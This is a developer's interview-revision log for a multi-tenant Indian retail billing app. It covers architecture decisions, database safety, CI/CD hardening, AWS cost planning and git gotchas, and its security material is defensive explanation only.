# Interview log

A running record of everything that happens while building this project: decisions, concepts, bugs, errors, commands and small gotchas. It is written so I can revise before an interview. Claude adds entries during every session (rule in `CLAUDE.md`), and I can add my own.

**How to revise:** read the Pitch and Numbers, then the Question bank, then skim the Log for stories. Search by tag, e.g. `#database`.

**Tags:** `#product` `#requirements` `#process` `#git` `#github` `#architecture` `#database` `#security` `#money` `#gst` `#frontend` `#backend` `#testing` `#devops` `#cloud` `#cost` `#ai` `#mistake` `#gotcha`

The phase journals (`phase-N.md`) are the short story of each phase. This file is the detailed diary behind them.

---

## Pitch

Update this as the project grows.

**30 seconds:** I'm building a multi-tenant web app, in English, Hindi and Hinglish, that runs an Indian retail shop: GST billing, inventory, customer credit (udhaar), staff attendance with salary and advances, an audit log, alerts on WhatsApp, and an AI assistant that answers questions about the shop's own data. The focus is correctness: nothing is ever deleted, a bill and its stock change save together or not at all, and each business's data is kept apart by the database itself. I also used it to learn DevOps: Docker, CI/CD with GitHub Actions, Terraform and AWS.

**2 minutes:** *(fill in as we build: the problem → what makes it hard → my architecture → one hard bug I solved → how it's deployed → what I'd do differently)*

---

## Numbers to remember

| What | Value | Where it comes from |
| --- | --- | --- |
| Max data loss in a disaster (RPO) | 5 minutes | RDS point-in-time restore — `product-overview.md` NFR 1 |
| Max time to recover (RTO) | 1 hour | Restore runbook + monthly drill |
| Scanned item appears on screen | < 200 ms | NFR 5 |
| Bill save | < 1 second | NFR 5 |
| Cloud budget | ₹0: AWS Free plan, up to $200 credits over 6 months | ADR 0011 |
| Hosting cost target | ~$25–35 / month of credits | ADR 0011 |
| Money stored as | whole paise (₹12.50 = 1250) | ADR 0008 |
| Largest exact amount in JavaScript | ≈ ₹90 lakh crore in paise (2^53) | ADR 0008 |
| Business types in v1 | 5 | Module 00 |
| Modules | 10 (00–09) | `docs/requirements/` |
| ADRs | 24 (16 at kickoff) | `docs/decisions/` |
| Secrets found before going public | 0, in 5 commits (gitleaks, full history) | ADR 0017 |
| Automated tests | 130: 74 unit (45 money helpers, 20 API config, error, process and shutdown, 9 migration check) + 20 integration on a real PostgreSQL (roles and grants, database client, health endpoints and headers, worker startup) + 36 web (routing, connection badge, the three languages, error screen) | `pnpm test` |
| Interface languages | 3: English, Hindi, Hinglish (`en`, `hi`, `hi-Latn`) | Module 00 #25, ADR 0023 |
| Web app download | ~122 KB gzipped JavaScript (383 KB raw); web image 93 MB (Caddy) | P0.5, `vite build` |
| PostgreSQL version | 18, everywhere (newest RDS supports) | ADR 0005, `compose.yaml` |
| Integration test run | ~3 s with the image cached, ~22 s on the first run | P0.3 |
| How long a new package version waits before we install it | 1 day | `pnpm-workspace.yaml` `minimumReleaseAge` |
| API Docker image | 375 MB, of which the app is 40 MB (the rest is `node:24-slim`) | P0.4 |
| First image build on a slow connection | ~12 minutes (later builds reuse the cached install layer) | P0.4 |
| Clean stop of api and worker | ~0.7 s, exit code 0 | P0.4 |
| CI checks on every pull request | 5 required: `check`, `secrets`, `migrations`, `smoke`, `pr-title` | ADR 0024 |
| CI run time | ~3 min in all; `check` (lint, types, 130 tests, build) about 50 s; `smoke` 2 min 47 s with an empty cache, 50 s warm | P0.6 |
| How often the screen checks the server | every 30 s, 10 s timeout (the API waits 5 s for the database) | P0.5, ADR 0001 |

---

## Question bank

Short answers; the Log entry has the full story.

- **Q: Why a modular monolith and not microservices?**
  A: A bill must save the bill, stock change, udhaar entry and audit log in one database transaction. In one process with one database that's a single `BEGIN…COMMIT`. With microservices it needs sagas and compensation, which is overkill for one developer. → ADR 0004
- **Q: How do you keep one business from seeing another's data?**
  A: Every row has a `business_id`, and PostgreSQL Row-Level Security filters every query by the business set for the current transaction. Even if my code forgets a `WHERE`, the database refuses. Tests try cross-business reads on purpose. → ADR 0006
- **Q: Two counters sell the last unit at the same moment. What happens?**
  A: Both run inside transactions that lock the stock row. The second waits for the first, then sees the updated number. Invoice numbers come from a locked counter row, so there are no duplicates or gaps. → ADR 0007
- **Q: The network drops while a bill is saving. Is it saved twice?**
  A: No. The screen sends an idempotency key with the bill. If it retries, the server sees the key already used and returns the original bill. → ADR 0007
- **Q: Why not store money as a decimal number?**
  A: Floating point can't represent 0.1 exactly (0.1 + 0.2 = 0.30000000000000004). I store whole paise as integers, so every sum is exact, and rounding happens in one tested place. → ADR 0008
- **Q: Why sessions and not JWTs?**
  A: When a staff member leaves, or the owner's screen locks, access must stop immediately. A session in the database can be revoked at once. A JWT stays valid until it expires. → ADR 0009
- **Q: How do you make sure a WhatsApp alert isn't lost if the server crashes?**
  A: The outbox pattern. The alert is written to a table in the same transaction as the business action, and a worker sends it later with retries. Commit means the message will go out; rollback means it never existed. → ADR 0010
- **Q: How does the AI avoid making up numbers or leaking salaries?**
  A: It can't query the database. It can only call a fixed set of my own functions, which run with the asking user's permissions. Every number in an answer comes from a function result. → ADR 0015
- **Q: How does CI deploy to AWS without storing AWS keys in GitHub?**
  A: OIDC. GitHub proves its identity to AWS for each run and gets short-lived credentials for one IAM role, so there's no long-lived secret to leak. → ADR 0012
- **Q: How did you host it with no budget?**
  A: AWS Free plan credits, and a design sized to them: one EC2 server running the same Docker Compose stack as my laptop, plus RDS for managed backups. I skipped the load balancer, NAT gateway and ECS, which would have used the credits in about 4 months. Everything is Terraform, so moving to ECS later is an infrastructure change only. → ADR 0011
- **Q: What's RPO and RTO for your app?**
  A: RPO is how much data you can lose (5 minutes, thanks to point-in-time restore). RTO is how long recovery takes (1 hour, checked by a monthly restore drill). → `product-overview.md` NFR 1
- **Q: Why did you test against a real database instead of mocks?**
  A: The bugs I care about (locks, concurrency, Row-Level Security) only exist in the real database. Testcontainers starts a throwaway PostgreSQL for each test run. → ADR 0013
- **Q: What's your branching and merge strategy?**
  A: GitHub flow. Each task is a short-lived branch, merged into a protected `main` by pull request. I squash-merge, so each PR becomes one Conventional Commit on `main`: history reads like a changelog, and one `git revert` undoes a whole feature. → ADR 0017
- **Q: Merge commit vs squash vs rebase?**
  A: A merge commit keeps every commit plus an extra merge commit, so history branches. Rebase replays every commit on top of `main`: linear, but work-in-progress commits land too. Squash turns the branch into one commit: linear and clean, and the details stay in the PR. → ADR 0017
- **Q: How do you keep secrets out of git?**
  A: Secrets live in environment variables, and `.gitignore` blocks `.env` files and keys. GitHub push protection rejects pushes containing known token formats. I scanned the full history with gitleaks before making the repo public, and CI runs it on every PR. If a secret ever leaks, I revoke it first, because deleting the commit doesn't remove the copies. → ADR 0017
- **Q: Why a monorepo?**
  A: The web app and the API share types, validation and money/GST code. In one repo that code lives once in `packages/shared`, and a change to it is checked against both sides in the same pull request. pnpm workspaces link the packages; a catalog keeps tool versions identical across them.
- **Q: How do you turn a typed "0.29" into paise without floating-point errors?**
  A: I never multiply the decimal. `0.29 * 100` is `28.999999999999996` in JavaScript. I split the text at the dot and do integer maths on the two parts, and anything that isn't plainly an amount (commas, `₹`, three decimals) is refused rather than guessed. → ADR 0008
- **Q: How do you defend against a malicious npm package?**
  A: The lockfile pins exact versions and checksums; pnpm blocks dependencies' install scripts unless I approve them; it won't install a version less than a day old, which is when most hijacked releases are caught; Dependabot alerts on known vulnerabilities.
- **Q: How do you know your checks actually catch problems?**
  A: I planted one deliberate error per check (a type error, a Node-only API in shared code, an `any`, an unawaited promise, bad formatting) and confirmed each command failed. A check that has never failed proves nothing.
- **Q: What's the difference between an image, a container and a volume?**
  A: An image is a read-only recipe (PostgreSQL 18 plus everything it needs). A container is a running copy of an image, and it's disposable. A volume is storage kept outside the container, so the data survives when the container is deleted. My database's data lives in a named volume. → ADR 0019
- **Q: How do you stop a bug in your code from deleting business data?**
  A: The app logs in as a database role that has no `DELETE` permission. A separate owner role runs migrations. Default privileges give every new table select, insert and update to the app role and nothing more, and an integration test proves delete, truncate, create and drop are all refused. → ADR 0019
- **Q: How do you make sure local, CI and production run the same database?**
  A: The PostgreSQL major version is written once, in `compose.yaml`. My integration test reads the image from that file, and Terraform will pin the same major version for RDS. → ADRs 0005, 0019
- **Q: How does a command-line tool log in to GitHub without your password?**
  A: The OAuth device flow. The tool gets a short code from GitHub, I approve that code in a browser where I'm already logged in, and the tool receives a token. Only enter codes your own device generated: entering someone else's code logs their device into your account.

- **Q: What's the difference between liveness and readiness?**
  A: Liveness says the process is alive, so there's no point restarting it. Readiness says it can do its job, here meaning the database answers. My API has `/api/health` (liveness, used by Docker's healthcheck) and `/api/health/ready` (503 when the database is down). Restarting the API wouldn't fix a database outage, so the restart check mustn't depend on the database. → ADR 0020
- **Q: How do you run database migrations in production?**
  A: A one-shot container from the same image runs them as the schema-owner role, and the app containers start only after it exits successfully. New code never meets an old schema, and the long-running app can't change the schema. → ADR 0021
- **Q: How do you stop secrets leaking from a public repo?**
  A: Five places: git (gitignore, gitleaks, push protection), images (secrets only arrive at container start, checked with `docker history`), the browser bundle (never a `VITE_` secret), CI (no secrets for fork PRs) and logs (messages only: pg-pool can attach the client, whose hidden password some serializers print, and Drizzle messages carry query values). → `docs/devops/secrets.md`
- **Q: How does your frontend call the API without CORS?**
  A: Same origin. Vite's dev server proxies `/api` in development, and Caddy serves the built files and reverse-proxies `/api` in Docker and on the server. The browser only calls relative `/api` URLs, so it needs no configuration and can't leak a secret through a `VITE_` variable. → ADR 0023
- **Q: How do users get a new deploy straight away while files are still cached?**
  A: Content-hashed file names. `/assets/*` is cached for a year as `immutable`, because a changed file gets a new name. `index.html` is `no-cache`, so the next load picks up the new names. Missing assets are a real 404 with `no-store`, never `index.html`. → ADR 0023
- **Q: What is a Content-Security-Policy and what does yours allow?**
  A: A header telling the browser where scripts, styles and requests may come from. Mine is `default-src 'self'` with no inline scripts, so an injected script can't run or send data elsewhere. I checked the built app in headless Chrome for violations, and error responses carry the header too. → ADR 0023
- **Q: How do you handle three languages, one of them Hindi in Latin letters?**
  A: i18next with `en`, `hi` and `hi-Latn` files. Keys are type-checked against English. Tests check that every file has the same keys, Hindi is Devanagari and Hinglish never is. `load: 'currentOnly'` stops Hinglish falling back to Devanagari. → ADR 0023
- **Q: How do you choose timeouts across layers?**
  A: Each caller waits longer than what it calls. The API waits 5 s for the database, so the browser waits 10 s. Otherwise a database outage can be reported as "server down", depending on which timer fires first. A test pins the relationship.

- **Q: What does your CI pipeline check?**
  A: Five required checks on every PR: lint, types, all tests against a real PostgreSQL and the build; a gitleaks scan of the whole history; a check that a new migration is newer than `main`'s (Drizzle skips older ones); the PR title; and a smoke test that builds the real images with a layer cache, starts them with Compose and checks headers, a failing migration and clean shutdowns. → ADR 0024
- **Q: How do you secure a GitHub Actions workflow?**
  A: Read-only token permissions, actions pinned to commit SHAs (tags can be moved, as in the tj-actions attack), no `pull_request_target`, no secrets in CI at all, `persist-credentials: false`, and event values like a PR title passed through `env:` rather than `${{ }}` inside a script, which would be script injection. → ADR 0024
- **Q: How do you know a CI check actually works?**
  A: I made each one fail on purpose: a badly formatted line, a fake API key, a wrong expected header and a bad PR title. I did it on a throwaway branch, because a fake secret committed to the real branch would stay in history and fail every later scan. → P0.6

---

## Glossary

Terms I learned on this project, in one line each.

| Term | Meaning |
| --- | --- |
| ACID | Transactions are Atomic (all or nothing), Consistent, Isolated (don't see each other's half-work), Durable (survive crashes) |
| ADR | Architecture Decision Record: a short file explaining one technical choice and why |
| Argon2id | A deliberately slow password-hashing algorithm, recommended by OWASP |
| BCP 47 | The standard for language tags: `hi` is Hindi, `hi-Latn` is Hindi written in Latin letters (Hinglish) |
| BOM | Byte-order mark: invisible bytes at the start of a text file; JSON parsers reject it, and PowerShell 5.1's "utf8" adds it |
| Cache busting | Putting a hash of a file's content in its name, so a changed file gets a new URL and old copies can be cached forever |
| Catalog (pnpm) | One list of dependency versions in `pnpm-workspace.yaml` that every package refers to with `"catalog:"` |
| Branch protection: up to date | A rule that a PR must contain the latest `main` before merging, so its checks ran against what it will actually join |
| CI / CD | Continuous Integration (test every change automatically) / Continuous Deployment (ship every green change automatically) |
| Container | A running, disposable copy of an image, isolated from the rest of the computer |
| Conventional Commits | Commit messages shaped `type(scope): summary`, e.g. `fix(gst): round CGST and SGST separately` |
| CDP | Chrome DevTools Protocol: JSON over WebSocket for controlling Chrome; Puppeteer and Playwright are built on it |
| CSP | Content-Security-Policy: a response header listing where the page may load scripts, styles and data from; anything else is refused |
| CSRF | A trick where another site makes your browser send a request with your cookies; blocked with SameSite cookies + tokens |
| Database role | A PostgreSQL login (or group) with its own permissions; here `app_owner` runs migrations, `app_runtime` is the app |
| Decorator metadata | Type information a compiler attaches to decorated classes; NestJS reads it to know what to inject |
| Default privileges | PostgreSQL rules that grant permissions on tables automatically when they're created later |
| Device flow | OAuth login for CLIs and TVs: the device shows a short code, you approve it in a browser where you're logged in |
| Docker Compose | One YAML file describing several containers, their settings and volumes, started with one command |
| Docker daemon | The background engine that builds and runs containers; the `docker` command only sends it requests |
| Exit code 143 | 128 + 15: the process ended because of SIGTERM rather than exiting by itself |
| Export conditions | Named entry points in a package's `exports` (`source`, `types`, `default`); each tool picks the one it understands |
| Fast refresh | Vite swapping a changed React component into the running page without a reload, keeping its state |
| FEFO | First Expiry, First Out: sell the batch that expires soonest |
| GitHub flow | `main` is always deployable; every change is a short-lived branch merged by pull request |
| Healthcheck | A command Docker runs repeatedly to decide whether a container is ready, not just started |
| httpOnly cookie | A cookie JavaScript can't read, so a script injected into the page can't steal the session |
| IaC | Infrastructure as Code: cloud resources created from code files (Terraform) instead of clicking in a console |
| Idempotency key | A unique ID sent with a request so repeating it has the same effect as sending it once |
| Image (Docker) | A read-only package of a program and everything it needs; containers are started from it |
| Liveness / readiness | "The process is alive" vs "it can serve requests now" (its dependencies answer) |
| Migration | A numbered SQL file that changes the database schema, applied once per database and tracked |
| Modular monolith | One deployable app split internally into modules with clear boundaries |
| Monorepo | One git repository holding several packages (here: web app, API, shared code) that are developed together |
| Multi-stage build | A Dockerfile with a build stage (tools, compilers) and a slim final stage that copies only the result |
| OIDC | OpenID Connect: lets one system prove its identity to another and get short-lived credentials |
| One-shot container | A container that does one job and exits, like `migrate`; `Exited (0)` means success |
| ORM | A library that maps database tables to code (Drizzle here) |
| Outbox pattern | Write "send this message" into the database in the same transaction, send it later from a worker |
| Peer dependency | A package that a plugin needs but expects you to install, in a version range it supports (typescript-eslint needs TypeScript) |
| PID 1 / init | The first process in a container; it receives Docker's stop signal. `init: true` adds a tiny init that forwards signals |
| PITR | Point-in-time restore: rebuild the database as it was at any second in the retention window |
| Project references | TypeScript's way to build several packages in dependency order, incrementally (`tsc -b`) |
| Proxy (dev) / reverse proxy | A server that takes the browser's request and forwards it to another server (here `/api` → the API), so the browser sees one origin |
| Push protection | GitHub rejects a `git push` that contains a known secret format, before it reaches the repo |
| RLS | Row-Level Security: PostgreSQL policies that decide which rows a query is allowed to see |
| RPO / RTO | Recovery Point Objective (max data you can lose) / Recovery Time Objective (max time to recover) |
| Ruleset | GitHub's rules for branches (require a PR, block force-push…), the newer form of branch protection |
| SIGTERM | The polite "please stop" signal; `docker stop` sends it, then kills the process after 10 s |
| SPA | Single-page app: the browser loads the app once and then only exchanges data with the server |
| SPA fallback | The web server answers any unknown path with `index.html`, so the app's router can show the right page after a refresh |
| Squash merge | All of a pull request's commits combined into one commit on `main` |
| Supply-chain attack | Attacking an app through something it depends on, e.g. publishing a poisoned version of a popular npm package |
| TDD | Test-driven development: write a failing test, watch it fail, write the least code that passes, then tidy up |
| Tenant | One customer business in a multi-tenant system |
| Required status check | A CI job that must pass before GitHub lets a pull request merge; set in the branch ruleset |
| Script injection (Actions) | Writing `${{ github.event... }}` inside `run:` pastes user-typed text into a shell script, which then runs it; pass it through `env:` instead |
| SHA pinning | Referring to an action by its full commit hash instead of a tag, so its code can't change without a visible edit |
| Smoke test | A quick check that the real built thing starts and answers, before deeper testing or a deploy |
| Testcontainers | A library that starts real throwaway services (here PostgreSQL) in Docker for a test run |
| Text shaping | Turning letters into correctly joined glyphs; Hindi (Devanagari) needs it for conjuncts like क्ष |
| Type-aware linting | Lint rules that use the TypeScript compiler's type information, e.g. "this promise is never awaited" |
| Volume (Docker) | Storage kept outside a container, so data survives when the container is removed |
| Workspace (pnpm) | The set of packages in a monorepo that pnpm installs and links together |

---

## Log

Entry format:

```markdown
### YYYY-MM-DD — Short title `#tag`
- **What happened:**
- **Why / what I learned:**
- **Say it in an interview:**
- **Follow-ups to expect:**
```

### 2026-10-29 — Studied the competition before designing `#product`
- **What happened:** Before writing requirements, compared the idea with Vyapar, myBillBook and Khatabook, plus AI shop assistants such as Khata Bhai.
- **Why / what I learned:** The features alone aren't unique. The edge has to be depth and correctness: staff + advances + udhaar + permissions + an AI that respects permissions, all in one well-built app.
- **Say it in an interview:** "I checked the market first. Since the feature list existed already, I competed on correctness and depth — a few polished modules beat many half-built ones."
- **Follow-ups to expect:** Who are the users? What would make a shop switch from Vyapar?

### 2026-10-29 — Requirements live in files, with DECIDED / DRAFT labels `#requirements` `#process`
- **What happened:** Moved all requirements from a chat into `docs/requirements/`, one file per module, each marked DECIDED or DRAFT, with a Change log. The repo is the single source of truth.
- **Why / what I learned:** Chats get lost or compacted; files in git have history. Labels stop half-formed ideas from being built as if they were agreed.
- **Say it in an interview:** "Every requirement has a status and a change log, so I always know what's agreed and why it changed."
- **Follow-ups to expect:** How do you handle a requirement change mid-build?

### 2026-10-29 — One app with business-type presets, not five apps `#product` `#architecture`
- **What happened:** Decided (Module 00) that kirana, medical, clothing, electronics and hardware are presets that switch features on, inside one app.
- **Why / what I learned:** This is the feature-flag idea: one codebase, behaviour controlled by settings. Mixed shops can switch on extra features.
- **Say it in an interview:** "Business types are configuration, not code branches. One codebase serves all five."
- **Follow-ups to expect:** How do you store type-specific item fields? (JSONB / optional columns — decided when building Module 01.)

### 2026-10-29 — Git and GitHub set up `#git` `#github`
- **What happened:** First commit "Import requirements from planning chat", renamed `master` → `main`, created a private GitHub repo and pushed.
- **Why / what I learned:** The requirements were safe in the cloud before any code existed. `main` is GitHub's default branch name.
- **Say it in an interview:** "I pushed the requirements on day one, so the laptop was never the only copy."
- **Follow-ups to expect:** What's your branching strategy? (Branch protection + PRs come in Phase 0, DevOps stage 1.)

### 2026-10-29 — GitHub login: Credential Manager vs `gh` `#github` `#gotcha`
- **What happened:** I had trouble logging in to GitHub. `gh auth login` is interactive, so Claude's terminal can't answer its prompts. The simpler route: Git for Windows ships Git Credential Manager, which opens a browser sign-in on the first `git push`.
- **Why / what I learned:** Git over HTTPS needs a credential. A credential helper stores it safely, and interactive commands must be run by me.
- **Say it in an interview:** "Git doesn't use your GitHub password over HTTPS any more; it uses a token or OAuth through a credential helper."
- **Follow-ups to expect:** HTTPS vs SSH for git? Personal access tokens?

### 2026-10-29 — Branch protection on a private repo needs GitHub Pro `#github` `#gotcha`
- **What happened:** While planning DevOps stage 1, found that GitHub Free only offers branch protection on public repos. Private repos need GitHub Pro, which students get free through the GitHub Student Developer Pack (along with cloud credits).
- **Why / what I learned:** Check plan limits before designing a workflow around a feature.
- **Say it in an interview:** "`main` is protected: changes only arrive through pull requests with green CI."
- **Follow-ups to expect:** What do branch protection rules enforce? (Required reviews and status checks; no force-push.)

### 2026-10-29 — The project folder is inside OneDrive `#gotcha` `#git`
- **What happened:** Noticed the repo sits in a OneDrive-synced Desktop folder.
- **Why / what I learned:** OneDrive syncing files while git writes them can corrupt `.git`, and `node_modules` (tens of thousands of files) slows sync badly. GitHub is the backup, not OneDrive. Plan: move it to a plain `projects` folder in my user folder, outside OneDrive.
- **Say it in an interview:** (small, but shows care) "I kept the repo out of cloud-sync folders: git is the version control, GitHub is the backup."
- **Follow-ups to expect:** —

### 2026-10-29 — Turned vague requirements into measurable targets `#requirements` `#devops`
- **What happened:** Confirmed the 7 non-functional requirements and gave them numbers: RPO 5 min, RTO 1 hour, scan < 200 ms, bill save < 1 s.
- **Why / what I learned:** "Fast" and "safe" can't be tested; numbers can. RPO and RTO are the standard way to state data-safety goals.
- **Say it in an interview:** "My top requirement was zero data loss, so I defined it as RPO 5 minutes and RTO 1 hour, and chose a database setup that meets it."
- **Follow-ups to expect:** How do you prove your backups work? (Monthly restore drill — an untested backup doesn't count.)

### 2026-10-29 — Online-first instead of offline billing `#architecture` → ADR 0001
- **What happened:** Chose online-first for v1, with the data designed so offline can be added later.
- **Why / what I learned:** Offline sync across several counters is where stock goes wrong and data gets lost. UUIDs created at the source and idempotency keys keep the door open.
- **Say it in an interview:** "I traded availability during outages for correctness, because correctness was the top requirement, and designed the IDs so offline is possible later."
- **Follow-ups to expect:** How would you add offline? (Local store per counter, a separate invoice series per counter, sync of append-only events.)

### 2026-10-29 — Idempotency keys `#backend` `#architecture`
- **What happened:** Every "create" request from the screen (bill, payment) carries a unique key. A retry with the same key returns the first result.
- **Why / what I learned:** Networks fail *after* the server saved but *before* the reply arrived. Without a key, the retry makes a second bill.
- **Say it in an interview:** "Retries are only safe if the operation is idempotent; payment APIs like Stripe use the same idea."
- **Follow-ups to expect:** Where do you store keys and for how long?

### 2026-10-29 — Chose TypeScript everywhere `#architecture` → ADR 0002
- **What happened:** Compared TypeScript (NestJS), Python (FastAPI) and Java (Spring Boot) backends.
- **Why / what I learned:** The safety requirements come from PostgreSQL in every option. So the language decides speed of building, and TypeScript lets the counter screen and server share types, validation and GST math.
- **Say it in an interview:** "The database gives me correctness; the language gives me speed. Shared code means a GST rule exists once."
- **Follow-ups to expect:** Node is single-threaded — how do you handle heavy work? (A separate worker process.)

### 2026-10-29 — Single-page app, not Next.js `#frontend` → ADR 0003
- **What happened:** Chose React + Vite as a single-page app.
- **Why / what I learned:** Server-side rendering helps SEO and first load for public pages. A logged-in counter app has neither need, and SSR adds a server to run.
- **Say it in an interview:** "I picked the tool for the job: no SEO need, so no server rendering — the app is static files on a CDN."
- **Follow-ups to expect:** When *would* you use Next.js?

### 2026-10-29 — Modular monolith, not microservices `#backend` → ADR 0004
- **What happened:** One NestJS app split into modules that mirror the requirement modules (00–09), with one deployable image and two entry points (api, worker).
- **Why / what I learned:** Microservices solve team-scaling problems I don't have, and break the single transaction a bill needs.
- **Say it in an interview:** "Microservices are an organisational tool. For one developer and one database, a modular monolith gives the same boundaries without distributed transactions."
- **Follow-ups to expect:** How do you stop modules reaching into each other's tables?

### 2026-10-29 — PostgreSQL + Drizzle `#database` → ADR 0005
- **What happened:** Chose PostgreSQL, with Drizzle ORM and SQL migration files in git.
- **Why / what I learned:** Needed transactions, row locks, Row-Level Security, constraints and fuzzy search. MongoDB's model fits documents, not bills with lines and ledgers. Drizzle stays close to SQL, so locks and policies are easy.
- **Say it in an interview:** "Relational data with strict money rules belongs in a relational database with real transactions."
- **Follow-ups to expect:** Prisma vs Drizzle? How do you run migrations without downtime?

### 2026-10-29 — Multi-tenancy with Row-Level Security `#database` `#security` → ADR 0006
- **What happened:** Compared database-per-business, schema-per-business, and shared tables with `business_id` + RLS. Chose shared + RLS.
- **Why / what I learned:** Shared tables are cheap and simple, and RLS makes the database enforce separation even if code has a bug. Gotchas: table owners and superusers bypass RLS, so the app must connect as a separate role. Use `set_config('app.business_id', $1, true)` (transaction-local), because `SET` can't take query parameters.
- **Say it in an interview:** "Defense in depth: my code filters by business, and the database filters again, so one forgotten `WHERE` can't leak data."
- **Follow-ups to expect:** What about connection pooling with session variables? (Transaction-local settings work with transaction pooling.)

### 2026-10-29 — "No deletes" is enforced by the database, not just code `#database` → ADR 0007
- **What happened:** The app's database role gets no `DELETE` permission on business tables, and only `INSERT` + `SELECT` on the entry log. Stock is a ledger of movements, not a number that gets overwritten.
- **Why / what I learned:** Code has bugs, so the last line of defense should be the database. Corrections are reversals with a reason, like accounting.
- **Say it in an interview:** "Even a bug in my code can't delete a bill, because the database user doesn't have the permission."
- **Follow-ups to expect:** How do you handle a privacy request to erase a customer? (Anonymise the personal fields, keep the financial record — to decide later.)

### 2026-10-29 — Invoice numbers under GST `#gst` `#database`
- **What happened:** Learned that GST rules (CGST Rule 46) require invoice numbers to be consecutive and unique per financial year, in one or more series. Chose a counter row per branch per financial year, locked inside the bill transaction.
- **Why / what I learned:** `MAX(number) + 1` breaks with two counters (both read the same max). A locked counter row gives no duplicates and no gaps. Lock stock rows in a fixed order (by item ID) so two bills can't deadlock.
- **Say it in an interview:** "Sequential numbering under concurrency is a classic race condition; I solved it with a row lock inside the same transaction."
- **Follow-ups to expect:** Why not a database sequence? (Sequences skip numbers when a transaction rolls back — gaps aren't allowed.)

### 2026-10-29 — Money as integer paise `#money` → ADR 0008
- **What happened:** All amounts are whole paise in a `bigint`, tax rates are basis points (18% = 1800), and rounding lives in one shared, tested module.
- **Why / what I learned:** `0.1 + 0.2 = 0.30000000000000004` in floating point. JavaScript numbers are exact up to 2^53, which is about ₹90 lakh crore in paise, so plain numbers are safe.
- **Say it in an interview:** "I never let a float touch money. Integers in the smallest unit, explicit rounding rules in one place."
- **Follow-ups to expect:** How do you split ₹100 three ways? (Allocate the leftover paisa deliberately.)

### 2026-10-29 — Sessions instead of JWTs `#security` → ADR 0009
- **What happened:** Logins create a session row in PostgreSQL. The browser holds only a random token in an httpOnly cookie. Passwords are hashed with Argon2id.
- **Why / what I learned:** Needed instant revocation (staff leaves, owner auto-lock, permission change). JWTs are hard to revoke before expiry.
- **Say it in an interview:** "JWTs are great for stateless services; for a shared shop computer where access must stop instantly, server sessions are the safer choice."
- **Follow-ups to expect:** CSRF with cookies? Where should a JWT be stored if used?

### 2026-10-29 — Outbox pattern for WhatsApp, jobs in PostgreSQL `#backend` → ADR 0010
- **What happened:** Background jobs run in pg-boss (a queue stored in PostgreSQL). Messages are written to an outbox in the same transaction as the action, then sent by the worker. A real WhatsApp Cloud API integration uses Meta's free test number, plus an in-app Outbox page.
- **Why / what I learned:** Sending a message directly inside a request either loses it (crash after commit) or sends it for a rolled-back action. The outbox fixes both. Using PostgreSQL as the queue avoids running Redis.
- **Say it in an interview:** "Fewer moving parts: the database I already back up is also my queue."
- **Follow-ups to expect:** At-least-once delivery means duplicates — how do you handle them? (Idempotent sending by message ID.)

### 2026-10-29 — AWS cost traps `#cloud` `#cost` → ADR 0011
- **What happened:** First plan: ECS Fargate + load balancer + RDS + CloudFront, assuming ₹1,000/month.
- **Why / what I learned:** Cost traps for students: a NAT gateway (~$35–45/month just to exist), EKS (~$73/month for the control plane), public IPv4 addresses ($0.005/hour each since 2024), load balancers, and forgotten environments. Secrets Manager charges per secret per month; SSM Parameter Store standard parameters are free.
- **Say it in an interview:** "Because everything is Terraform, I can destroy and recreate an environment in minutes, so it only uses credits while it runs."
- **Follow-ups to expect:** How do you avoid a NAT gateway? (Public subnet with a tight security group, or VPC endpoints.)

### 2026-10-29 — Redesigned hosting for a ₹0 budget `#cloud` `#cost` `#architecture` → ADR 0011
- **What happened:** I told Claude I have no monthly budget and will use an AWS Free plan account. We read the official rules: up to $200 credits over 6 months, "You won't be charged unless you convert to a Paid plan", and the account closes after 6 months or when credits run out. The Fargate + load balancer design (~$45–55/month) would have closed the account in about 4 months. New design: one EC2 server running Docker Compose (Caddy + api + worker) + RDS with point-in-time restore + a nightly `pg_dump` to S3, about $25–35/month.
- **Why / what I learned:** Design to the real constraint. Keep the part that protects the top requirement (managed backups) and cut what only adds scale (load balancer, ECS). Time the 6-month window to placement season. Because the demo data is a seed and the infrastructure is Terraform, the account closing loses nothing.
- **Say it in an interview:** "I sized the architecture to a zero budget without giving up point-in-time restore, and because it's all containers and Terraform, scaling to ECS behind a load balancer is an infrastructure change, not an app change."
- **Follow-ups to expect:** What breaks first if traffic grows 100×? (The single server: add a load balancer and more instances, or move to ECS.) Why not run PostgreSQL on the EC2 to save more? (Then I'd own backups and PITR, the riskiest thing to self-manage.)

### 2026-10-29 — Checked the laptop before installing anything `#devops` `#gotcha`
- **What happened:** Claude checked what was installed: Git, GitHub CLI, Node 24 (LTS) and VS Code were there; pnpm, Docker, WSL and Terraform were missing. Two gotchas: Windows reported "virtualization disabled", but that's what it says when a hypervisor is *already* running (it was enabled). And an `aws` command existed but was a broken old pip install of AWS CLI v1.
- **Why / what I learned:** Docker Desktop on Windows runs Linux containers inside WSL 2, so WSL comes first. Verify tools by running them, not by checking that the command exists.
- **Say it in an interview:** "Before setting up, I audited the machine: what's installed, which versions, what's broken."
- **Follow-ups to expect:** What is WSL 2? Why do Linux containers need a Linux kernel?

### 2026-10-29 — "LF will be replaced by CRLF" warnings `#git` `#gotcha`
- **What happened:** Git on Windows warned that line endings would be converted, because Windows uses CRLF and Linux uses LF. Planned fix in P0.1: a `.gitattributes` file with `* text=auto eol=lf`.
- **Why / what I learned:** The code runs in Linux containers and on Linux CI. Mixed line endings break shell scripts (`/bin/sh^M: bad interpreter`) and create noisy diffs.
- **Say it in an interview:** "I pinned line endings in `.gitattributes` so Windows and Linux machines produce identical files."
- **Follow-ups to expect:** What does `core.autocrlf` do?

### 2026-10-29 — Rewrote commit messages and force-pushed safely `#git`
- **What happened:** Both commits had an AI co-author line, and I wanted the history to show only me. Removed it with `git filter-branch --msg-filter`, then pushed with `git push --force-with-lease=main:<old commit>`. Added a rule to `CLAUDE.md`: no AI attribution in commits.
- **Why / what I learned:** Rewriting history changes every commit hash after the change, so the remote must be force-updated. `--force-with-lease` only overwrites if the remote still points where I expect, so it can't wipe someone else's newer work the way plain `--force` can. Only do this on branches nobody else uses. Modern tool: `git filter-repo`.
- **Say it in an interview:** "I never use plain `--force`; `--force-with-lease` checks the remote first, and I only rewrite history on branches I own."
- **Follow-ups to expect:** `git revert` vs `git reset` vs rewriting history? Why not rewrite a shared `main`?

### 2026-10-29 — How I (and Claude) get into AWS: SSO, not access keys or console clicking `#cloud` `#security` `#devops`
